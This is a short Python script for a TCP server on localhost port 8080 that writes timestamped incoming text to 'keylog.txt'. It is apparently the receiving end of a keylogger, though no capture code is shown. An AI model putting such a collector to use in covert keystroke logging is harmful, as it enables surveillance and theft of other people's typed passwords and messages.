import socket
import datetime

# Server configuration
HOST = "127.0.0.1"  
PORT = 8080       # Port to listen on
LOG_FILE = "keylog.txt"

def start_server():
    print(f"Starting server on {HOST}:{PORT}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print("Server listening for connections...")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Connection established with {client_address}")
            with client_socket:
                while True:
                    try:
                        data = client_socket.recv(1024).decode("utf-8")
                        if not data:
                            break
                        # Write received data to the log file
                        with open(LOG_FILE, "a") as file:
                            file.write(f"{datetime.datetime.now()}: {data}\n")
                    except Exception as e:
                        print(f"Error: {e}")
                        break

if __name__ == "__main__":
    start_server()
